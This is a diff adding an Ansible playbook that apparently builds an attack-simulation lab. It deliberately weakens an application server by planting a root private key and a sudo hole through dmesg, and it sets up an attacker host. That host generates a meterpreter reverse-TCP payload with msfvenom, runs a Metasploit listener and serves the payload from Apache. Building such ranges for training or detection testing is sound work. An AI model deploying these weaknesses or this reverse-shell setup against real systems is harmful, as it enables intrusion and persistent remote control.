@@ -1,0 +1,150 @@
+---
+- name: Make application server (entrypoint) vulnerable
+  become: true
+  hosts: application_server
+  roles:
+    - role: rootkeys
+      become: true
+      vars:
+        rootkeys_public_key_user: root
+        rootkeys_install_private: true
+        rootkeys_install_public: false
+        rootkeys_private_dir: /root/.bkp
+    - role: sudoweakness
+      vars:
+        sudoweakness_user: "{{ supplypro_user }}"
+        sudoweakness_filename: 20{{ supplypro_user }}
+        sudoweakness_vulnbin: /usr/bin/dmesg
+
+- name: Make mailserver (target) vulnerable
+  become: true
+  hosts: mailservers, !global_mail
+  roles:
+    - role: rootkeys
+      become: true
+      vars:
+        rootkeys_public_key_user: root
+        rootkeys_install_private: false
+        rootkeys_install_public: true
+
+- name: Setup attacker
+  hosts: attacker_4
+  tasks:
+    # Bootstrap
+
+    - name: Create attack directory
+      become: true
+      ansible.builtin.file:
+        path: /opt/app_attack/
+        state: directory
+        mode: "0755"
+
+    - name: Update apt cache
+      become: true
+      ansible.builtin.apt:
+        update_cache: true
+        cache_valid_time: 3600
+
+    - name: Install basic software
+      become: true
+      ansible.builtin.apt:
+        name: [nmap, hydra, ncat, libxcb-image0, python3-pip, apache2]
+        state: present
+
+    # Metasploit
+
+    # - name: Copy metasploit installer (msfinstall)
+    #   become: true
+    #   ansible.builtin.copy:
+    #     src: installs/msfupdate.erb
+    #     dest: /tmp/msfinstall
+    #     mode: "0755"
+
+    # - name: Install Metasploit via msfinstall
+    #   become: true
+    #   ansible.builtin.command:
+    #     cmd: /tmp/msfinstall
+    #     creates: /opt/metasploit-framework/bin
+
+    - name: Deploy msf-loader
+      become: true
+      ansible.builtin.template:
+        dest: /opt/app_attack/msf-loader
+        src: msf-loader.j2
+        mode: "0644"
+
+    - name: Deploy autoexec
+      become: true
+      ansible.builtin.template:
+        dest: /opt/app_attack/autoexec
+        src: autoexec.j2
+        mode: "0644"
+
+    - name: Create exploit via msfvenom
+      become: true
+      ansible.builtin.shell:
+        cmd: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={{ ansible_default_ipv4.address }} LPORT=443 -f elf > /opt/app_attack/{{ app_attack_exploit_filename
+          }}
+        chdir: /opt/app_attack/
+        creates: /opt/app_attack/{{ app_attack_exploit_filename }}
+
+    - name: Metasploit attacker service
+      become: true
+      ansible.builtin.template:
+        src: metasploit-attacker.service.j2
+        dest: /lib/systemd/system/metasploit-attacker.service
+
+    - name: Reload systemd and start metasploit-attacker
+      become: true
+      ansible.builtin.systemd:
+        daemon_reload: true
+        name: metasploit-attacker
+        state: started
+
+    # Webserver
+
+    - name: Ensure apache is running
+      become: true
+      ansible.builtin.systemd:
+        name: apache2
+        state: started
+
+    - name: Remove artefacts from webroot
+      become: true
+      ansible.builtin.file:
+        path: /var/www/html/{{ item }}
+        state: absent
+      loop:
+        - index.html
+        - "{{ app_attack_exploit_filename }}"
+
+    - name: Copy exploit to apache webroot
+      become: true
+      ansible.builtin.copy:
+        src: /opt/app_attack/{{ app_attack_exploit_filename }}
+        dest: /var/www/html/{{ app_attack_exploit_filename }}
+        remote_src: true
+
+    - name: Update Apache configuration
+      become: true
+      ansible.builtin.lineinfile:
+        path: /etc/apache2/apache2.conf
+        regexp: "^DirectoryIndex "
+        line: DirectoryIndex {{ app_attack_exploit_filename }}
+      notify: Restart Apache
+
+    # Attack chain
+
+    - name: Copy Attack chain
+      become: true
+      ansible.builtin.copy:
+        src: attack_chain/
+        dest: /opt/app_attack/
+        mode: a+x
+
+  handlers:
+    - name: Restart Apache
+      become: true
+      ansible.builtin.service:
+        name: apache2
+        state: restarted
